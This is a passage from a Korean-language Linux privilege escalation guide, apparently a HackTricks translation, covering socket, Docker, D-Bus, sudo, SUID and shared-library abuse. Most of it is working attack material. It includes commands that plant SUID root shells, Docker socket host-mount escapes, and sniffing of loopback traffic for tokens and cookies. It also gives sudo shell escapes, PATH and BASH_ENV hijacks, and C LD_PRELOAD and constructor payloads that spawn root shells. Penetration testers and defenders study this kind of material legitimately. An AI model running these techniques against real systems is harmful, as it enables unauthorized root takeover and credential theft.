쓰기 가능한 `.socket` 파일을 찾은 경우 `[Socket]` 섹션의 맨 앞에 `ExecStartPre=/home/kali/sys/backdoor` 같은 항목을 **추가할 수 있으며**, 그러면 소켓이 생성되기 전에 백도어가 실행됩니다. 따라서 **대부분의 경우 머신을 재부팅할 때까지 기다려야 할 것입니다.**\
_NOTE: 해당 시스템이 그 소켓 파일 구성을 사용하고 있어야 하며, 그렇지 않으면 백도어는 실행되지 않습니다_

### Socket activation + writable unit path (create missing service)

또 다른 심각한 오용 구성은:

- `Accept=no` 및 `Service=<name>.service` 설정을 가진 소켓 유닛
- 참조된 service 유닛이 존재하지 않음
- 공격자가 `/etc/systemd/system`(또는 다른 유닛 검색 경로)에 쓸 수 있음

이 경우 공격자는 `<name>.service`를 생성한 다음 소켓에 트래픽을 발생시켜 systemd가 새로운 서비스를 로드하고 root로 실행하게 할 수 있습니다.

빠른 흐름:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 쓰기 가능한 sockets

만약 **쓰기 가능한 socket을 식별한다면** (_지금은 Unix Sockets에 대해 말하는 것이며 설정 `.socket` 파일에 관한 것이 아니다_), 해당 socket과 **통신할 수** 있고 취약점을 악용할 수도 있다.

### Unix Sockets 열거
```bash
netstat -a -p --unix
```
### 원시 연결
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

일부 **sockets listening for HTTP** 요청이 있을 수 있습니다 (_나는 .socket files에 대해 말하는 것이 아니라 unix sockets로 동작하는 파일들에 대해 말하는 것입니다_). 다음 명령으로 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
만약 소켓이 **HTTP 요청으로 응답**한다면, 해당 소켓과 **통신**할 수 있으며 **취약점을 악용**할 수도 있습니다.

### 쓰기 가능한 Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
이 명령들은 호스트의 파일 시스템에 대한 루트 권한으로 컨테이너를 실행할 수 있게 해줍니다.

#### **Docker API 직접 사용**

Docker CLI를 사용할 수 없는 경우에도 Docker socket은 Docker API와 `curl` 명령으로 조작할 수 있습니다.

1.  **List Docker Images:** 사용 가능한 이미지 목록을 가져옵니다.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 호스트 시스템의 루트 디렉터리를 마운트하는 컨테이너를 생성하기 위한 요청을 보냅니다.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

생성한 컨테이너 시작:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`를 사용해 컨테이너에 연결을 설정하고 그 안에서 명령을 실행할 수 있게 합니다.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 연결을 설정한 후에는 컨테이너 내에서 호스트 파일시스템에 대한 루트 권한으로 직접 명령을 실행할 수 있습니다.

### Others

docker 소켓에 대한 쓰기 권한이 있다면, 즉 **group `docker`에 속해 있다면** [**더 많은 권한 상승 방법**](interesting-groups-linux-pe/index.html#docker-group)을 사용할 수 있다는 점을 주의하세요. 만약 [**docker API가 포트에서 리스닝 중이라면** 당신도 이를 침해할 수 있습니다](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

docker에서 벗어나거나 이를 악용해 권한을 상승시키는 더 많은 방법들은 다음을 확인하세요:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 권한 상승

만약 **`ctr`** 명령을 사용할 수 있다면 다음 페이지를 읽어보세요 — **이를 악용해 권한을 상승시킬 수 있습니다**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 권한 상승

만약 **`runc`** 명령을 사용할 수 있다면 다음 페이지를 읽어보세요 — **이를 악용해 권한을 상승시킬 수 있습니다**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus는 애플리케이션이 효율적으로 상호작용하고 데이터를 공유할 수 있게 하는 정교한 프로세스 간 통신(IPC) 시스템입니다. 최신 Linux 시스템을 염두에 두고 설계되어, 다양한 형태의 애플리케이션 간 통신을 위한 강력한 프레임워크를 제공합니다.

이 시스템은 유연하여 프로세스 간 데이터 교환을 향상시키는 기본적인 IPC(강화된 UNIX 도메인 소켓과 유사)를 지원합니다. 또한 이벤트나 신호를 브로드캐스트하는 기능을 제공하여 시스템 구성요소 간의 원활한 통합을 촉진합니다. 예를 들어, Bluetooth 데몬이 걸려오는 호출에 대한 신호를 보내면 음악 플레이어가 음소거되는 식으로 사용자 경험을 향상시킬 수 있습니다. 추가로, D-Bus는 원격 객체 시스템을 지원하여 애플리케이션 간 서비스 요청과 메서드 호출을 단순화함으로써 전통적으로 복잡했던 과정을 간소화합니다.

D-Bus는 **허용/거부 모델**로 작동하며, 매칭되는 정책 규칙들의 누적 효과에 따라 메시지 권한(메서드 호출, 신호 전송 등)을 관리합니다. 이러한 정책들은 버스와의 상호작용을 명시하며, 해당 권한을 악용함으로써 권한 상승이 가능해질 수 있습니다.

예를 들어 `/etc/dbus-1/system.d/wpa_supplicant.conf`에 있는 이러한 정책의 예가 제공되며, 여기에는 root 사용자가 `fi.w1.wpa_supplicant1`을 소유하고, 그로부터 메시지를 보내고 받을 수 있는 권한에 대한 상세한 내용이 포함되어 있습니다.

사용자나 그룹이 지정되지 않은 정책은 보편적으로 적용되며, "default" 컨텍스트 정책은 다른 특정 정책으로 다루어지지 않는 모든 대상에 적용됩니다.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**여기에서 D-Bus 통신을 enumerate하고 exploit하는 방법을 알아보세요:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **네트워크**

네트워크를 enumerate하고 머신의 위치를 파악하는 것은 항상 흥미롭습니다.

### 일반적인 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### 아웃바운드 필터링 빠른 분류

호스트가 명령을 실행할 수 있으나 callbacks가 실패한다면 DNS, transport, proxy 및 route 필터링을 빠르게 구분하세요:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

항상 접근하기 전에 이전에 상호작용할 수 없었던 머신에서 실행 중인 network services를 확인하세요:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classify listeners by bind target:

- `0.0.0.0` / `[::]`: 모든 로컬 인터페이스에 노출됨.
- `127.0.0.1` / `::1`: 로컬 전용 (good tunnel/forward candidates).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): 보통 내부 세그먼트에서만 접근 가능.

### 로컬 전용 서비스 트리아지 워크플로우

호스트를 탈취하면, `127.0.0.1`에 바인드된 서비스가 종종 셸에서 처음으로 접근 가능해집니다. 빠른 로컬 워크플로우는 다음과 같습니다:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS를 네트워크 스캐너로 사용하기 (네트워크 전용 모드)

로컬 PE 검사 외에도, linPEAS는 집중된 네트워크 스캐너로 실행될 수 있습니다. `$PATH`에 있는 사용 가능한 바이너리(일반적으로 `fping`, `ping`, `nc`, `ncat`)를 사용하며 툴을 설치하지 않습니다.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
만약 `-d`, `-p`, 또는 `-i`를 `-t` 없이 전달하면, linPEAS는 순수 네트워크 스캐너로 동작합니다 (나머지 privilege-escalation 검사들은 건너뜁니다).

### Sniffing

트래픽을 sniff할 수 있는지 확인하세요. 가능하다면 일부 credentials를 획득할 수 있습니다.
```
timeout 1 tcpdump
```
빠른 실무 점검:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`)는 post-exploitation에서 특히 유용한데, 많은 내부 전용(internal-only) 서비스가 그곳에서 tokens/cookies/credentials를 노출하기 때문입니다:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
지금 캡처하고 나중에 파싱:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## 사용자

### 일반 열거

자신이 **누구인지**, 어떤 **권한**을 가지고 있는지, 시스템에 어떤 **사용자들**이 있는지, 누가 **로그인**할 수 있는지, 누가 **root privileges**를 가지고 있는지 확인하세요:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 큰 UID

일부 Linux 버전은 **UID > INT_MAX** 사용자가 권한을 상승시킬 수 있는 버그의 영향을 받았습니다. 자세한 정보: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 및 [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### 그룹

root 권한을 부여할 수 있는 어떤 그룹의 **구성원인지 확인하세요:**


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 클립보드

가능하다면 클립보드에 흥미로운 내용이 있는지 확인하세요
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 비밀번호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

환경의 **비밀번호를 알고 있다면**, 그 비밀번호를 사용해 **각 사용자로 로그인해 보세요**.

### Su Brute

많은 소음을 발생시키는 것이 괜찮고 시스템에 `su` 및 `timeout` 바이너리가 있다면, [su-bruteforce](https://github.com/carlospolop/su-bruteforce)를 사용해 사용자를 브루트포스해 볼 수 있습니다.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 `-a` 옵션으로 사용자 브루트포스도 시도합니다.

## Writable PATH abuses

### $PATH

$PATH의 어떤 폴더에 **쓰기할 수 있는 경우**, 쓰기 가능한 폴더 안에 다른 사용자(이상적으로는 root)가 실행할 명령 이름으로 **백도어를 생성**하여 권한을 상승시킬 수 있습니다. 단, 해당 명령이 $PATH에서 당신의 쓰기 가능한 폴더보다 **앞에 위치한** 폴더에서 로드되지 않아야 합니다.

### SUDO and SUID

You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
일부 **예상치 못한 명령은 파일을 읽고/또는 쓰거나 심지어 명령을 실행할 수 있게 해줍니다.** 예를 들어:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 설정은 사용자가 비밀번호를 알지 못해도 다른 사용자의 권한으로 일부 명령을 실행할 수 있게 허용할 수 있다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
이 예에서 사용자 `demo`는 `root`로 `vim`을 실행할 수 있으므로, 루트 디렉터리에 ssh key를 추가하거나 `sh`를 호출해 shell을 얻는 것은 매우 쉽습니다.
```
sudo vim -c '!sh'
```
### SETENV

이 지시문은 사용자가 무언가를 실행하는 동안 **환경 변수를 설정**할 수 있게 합니다:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예제는 **based on HTB machine Admirer**를 기반으로 하며, 스크립트를 root로 실행하는 동안 임의의 python library를 로드하기 위해 **PYTHONPATH hijacking**에 **vulnerable** 했습니다:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV는 sudo env_keep를 통해 보존됨 → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- 작동 원리: 비대화형 셸에서는 Bash가 `$BASH_ENV`를 평가하고 대상 스크립트를 실행하기 전에 해당 파일을 source한다. 많은 sudo 규칙은 스크립트나 셸 래퍼를 실행하도록 허용한다. 만약 sudo가 `BASH_ENV`를 보존한다면, 당신의 파일은 root 권한으로 소스된다.

- 요구 사항:
- 실행 가능한 sudo 규칙(비대화형으로 `/bin/bash`를 호출하는 대상이나, 어떤 bash 스크립트든지).
- `BASH_ENV`가 `env_keep`에 포함되어 있음 (`sudo -l`로 확인).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 하드닝:
- env_keep에서 `BASH_ENV` (및 `ENV`)를 제거하고, `env_reset`을 선호하세요.
- sudo로 허용된 명령에 대해 셸 래퍼 사용을 피하고, 최소한의 바이너리를 사용하세요.
- 보존된 환경 변수 사용 시 sudo I/O 로깅 및 경고를 고려하세요.

### sudo로 HOME이 보존된 상태에서의 Terraform (!env_reset)

만약 sudo가 환경을 유지한 채(`!env_reset`) `terraform apply`를 허용하면, `$HOME`은 호출한 사용자의 것으로 남습니다. 따라서 Terraform은 루트로서 **$HOME/.terraformrc**를 로드하고 `provider_installation.dev_overrides`를 적용합니다.

- 필요한 provider를 쓰기 가능한 디렉터리로 지정하고, provider 이름으로 된 악성 플러그인(예: `terraform-provider-examples`)을 배치하세요:
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform은 Go plugin 핸드셰이크에 실패하지만 종료되기 전에 페이로드를 root 권한으로 실행하여 SUID 쉘을 남깁니다.

### TF_VAR 오버라이드 + symlink 검증 우회

Terraform 변수는 `TF_VAR_<name>` 환경 변수로 제공할 수 있으며, sudo가 환경을 보존할 때 유지됩니다. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 같은 약한 검증은 symlink로 우회할 수 있습니다:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform은 심볼릭 링크를 해석하여 실제 `/root/root.txt`를 공격자가 읽을 수 있는 대상 위치로 복사합니다. 동일한 방법으로 대상 심볼릭 링크를 미리 생성해 provider의 대상 경로가 `/etc/cron.d/` 안을 가리키도록 함으로써 특권 경로에 **쓰기**할 수도 있습니다.

### requiretty / !requiretty

일부 오래된 배포판에서는 sudo가 `requiretty`로 설정될 수 있으며, 이 설정은 sudo가 대화형 TTY에서만 실행되도록 강제합니다. `!requiretty`가 설정되어 있거나(또는 해당 옵션이 없으면) sudo는 reverse shells, cron jobs, scripts와 같은 비대화형 컨텍스트에서도 실행될 수 있습니다.
```bash
Defaults !requiretty
```
이것 자체만으로는 직접적인 취약점은 아니지만, full PTY가 필요하지 않은 상황에서도 sudo 규칙을 악용할 수 있는 경우를 확대합니다.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- Requirements: a sudo rule (often `NOPASSWD`) running a script/binary that calls commands without absolute paths (`free`, `df`, `ps`, etc.) and a writable PATH entry that is searched first.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 실행 경로 우회
**Jump**로 다른 파일을 읽거나 **symlinks**를 사용하세요. 예를 들어 sudoers 파일: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
만약 **wildcard**가 사용된다면 (\*), 훨씬 더 쉽습니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 명령/SUID 바이너리 (명령 경로 없음)

특정 명령에 대해 **sudo 권한**이 **경로를 지정하지 않고** 부여된 경우: _hacker10 ALL= (root) less_ , PATH 변수를 변경하여 이를 악용할 수 있습니다.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 기술은 **suid** 바이너리가 **경로를 지정하지 않고 다른 명령을 실행할 경우(항상 이상한 SUID 바이너리의 내용을 _**strings**_ 로 확인하세요)**에도 사용할 수 있습니다.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

만약 **suid** 바이너리가 **경로를 지정하여 다른 명령을 실행**한다면, suid 파일이 호출하는 명령 이름으로 **export a function**을 생성해 시도해볼 수 있습니다.

예를 들어, 만약 suid 바이너리가 _**/usr/sbin/service apache2 start**_ 를 호출한다면, 해당 함수를 생성하고 export해야 합니다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
그런 다음 suid 바이너리를 호출하면 이 함수가 실행됩니다

### SUID wrapper에 의해 실행되는 쓰기 가능한 스크립트

일반적인 커스텀 앱 잘못된 구성 사례로는 root-owned SUID 바이너리 wrapper가 스크립트를 실행하지만, 그 스크립트 자체는 low-priv users에 의해 쓰기 가능한 경우가 있습니다.

전형적인 패턴:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
만약 `/usr/local/bin/backup.sh`에 쓰기 권한이 있다면, payload 명령을 추가한 다음 SUID wrapper를 실행할 수 있습니다:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
빠른 확인:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
이 공격 경로는 특히 `/usr/local/bin`에 배포되는 "유지관리"/"백업" 래퍼에서 흔히 발생합니다.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 환경 변수는 하나 이상의 공유 라이브러리(.so 파일)를 로더가 표준 C 라이브러리(`libc.so`)를 포함한 다른 라이브러리들보다 먼저 로드하도록 지정하는 데 사용됩니다. 이 과정을 라이브러리 프리로딩(preloading)이라고 합니다.

그러나 시스템 보안을 유지하고 특히 **suid/sgid** 실행 파일에서 이 기능이 악용되는 것을 방지하기 위해 시스템은 다음과 같은 조건을 강제합니다:

- 로더는 실제 사용자 ID (_ruid_)가 유효 사용자 ID (_euid_)와 일치하지 않는 실행 파일에 대해 **LD_PRELOAD**를 무시합니다.
- **suid/sgid**가 설정된 실행 파일의 경우, 동일하게 **suid/sgid**로 설정된 표준 경로의 라이브러리만 프리로드됩니다.

`sudo`로 명령을 실행할 수 있고 `sudo -l`의 출력에 문구 **env_keep+=LD_PRELOAD**가 포함되어 있다면 권한 상승이 발생할 수 있습니다. 이 구성은 명령을 `sudo`로 실행할 때도 **LD_PRELOAD** 환경 변수가 유지되어 인식되도록 허용하므로, 임의 코드를 향상된 권한으로 실행하게 될 가능성이 있습니다.
```
Defaults        env_keep += LD_PRELOAD
```
다음 이름으로 저장: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그런 다음 다음을 사용하여 **compile it**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마지막으로, **escalate privileges**를 실행합니다
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 유사한 privesc는 공격자가 **LD_LIBRARY_PATH** env variable을 제어할 수 있다면 악용될 수 있습니다. 이는 라이브러리가 검색될 경로를 공격자가 제어하기 때문입니다.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

비정상적으로 보이는 **SUID** permissions를 가진 binary를 발견하면, 해당 binary가 **.so** 파일을 제대로 로드하는지 확인하는 것이 좋습니다. 다음 명령어를 실행하여 확인할 수 있습니다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 와 같은 오류가 발생하면 잠재적인 exploitation 가능성이 있음을 나타냅니다.

To exploit this, 다음과 같이 C 파일을 생성합니다. 예: _"/path/to/.config/libcalc.c"_ 그리고 다음 코드를 포함합니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일되어 실행되면 파일 권한을 조작하고 권한이 상승된 shell을 실행하여 권한 상승을 시도합니다.

위의 C 파일을 다음과 같이 공유 객체(.so) 파일로 컴파일하세요:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
마지막으로, 영향을 받는 SUID 바이너리를 실행하면 exploit이 트리거되어 시스템 탈취로 이어질 수 있습니다.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
이제 우리가 쓰기 가능한 폴더에서 라이브러리를 로드하는 SUID 바이너리를 찾았으므로, 해당 폴더에 필요한 이름으로 라이브러리를 생성해 보겠습니다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
다음과 같은 오류가 발생하면
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
즉, 생성한 라이브러리에는 `a_function_name`이라는 이름의 함수가 있어야 합니다.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 은 공격자가 로컬 보안 제한을 우회하기 위해 악용할 수 있는 Unix 바이너리들의 선별된 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/) 는 명령에 **인수만 주입할 수 있는 경우**에 해당하는 동일한 자료입니다.

이 프로젝트는 제한된 셸을 탈출하거나 escalate or maintain elevated privileges 하고, 파일을 전송하고, bind and reverse shells를 생성하며, 기타 post-exploitation 작업을 용이하게 하는 데 악용될 수 있는 Unix 바이너리의 정당한 기능들을 수집합니다.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

만약 `sudo -l`에 접근할 수 있다면, 도구 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 를 사용해 어떤 sudo 규칙을 악용할 방법을 찾는지 확인할 수 있습니다.

### Reusing Sudo Tokens

비밀번호는 모르는 상태에서 **sudo access**가 있는 경우, sudo 명령 실행을 기다렸다가 세션 토큰을 탈취하여 권한을 상승시킬 수 있습니다.

Requirements to escalate privileges:

- 이미 _sampleuser_ 사용자로 셸을 가지고 있어야 합니다
